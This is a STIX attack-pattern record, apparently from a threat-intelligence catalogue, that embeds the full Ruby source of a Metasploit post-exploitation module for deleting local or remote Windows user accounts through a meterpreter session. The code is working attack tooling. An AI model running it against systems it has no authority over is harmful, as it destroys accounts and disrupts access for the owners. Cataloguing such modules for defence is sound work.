{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--746b61f9-128a-4052-aefd-3fd24aed9599",
    "created": "2024-08-14T16:33:04.995845Z",
    "modified": "2024-08-14T16:33:04.995849Z",
    "name": "Windows Manage Local User Account Deletion",
    "description": " This module deletes a local user account from the specified server or the local machine if no server is given.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/delete_user.rb",
            "external_id": "delete_user.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Accounts\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Manage Local User Account Deletion',\n        'Description' => %q{\n          This module deletes a local user account from the specified server,\n          or the local machine if no server is given.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'chao-mu'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ]\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('USERNAME', [ true, 'The username of the user to delete (not-qualified, e.g. BOB)' ]),\n        OptString.new('SERVER_NAME', [ false, ' DNS or NetBIOS name of remote server on which to delete user' ]),\n      ]\n    )\n  end\n\n  def run\n    username = datastore['USERNAME']\n    target_server = datastore['SERVER_NAME']\n\n    status = delete_user(username, target_server || nil)\n\n    case status\n    when :success\n      print_status 'User was deleted!'\n    when :invalid_server\n      print_error 'The server you specified was invalid'\n    when :not_on_primary\n      print_error 'You must be on the primary domain controller to do that'\n    when :user_not_found\n      print_error 'User did not exist!'\n    when :access_denied\n      print_error 'Sorry, you do not have permission to delete that user'\n    when nil\n      print_error 'Something horrible just happened. Sorry.'\n    else\n      print_error 'This module is out of date'\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}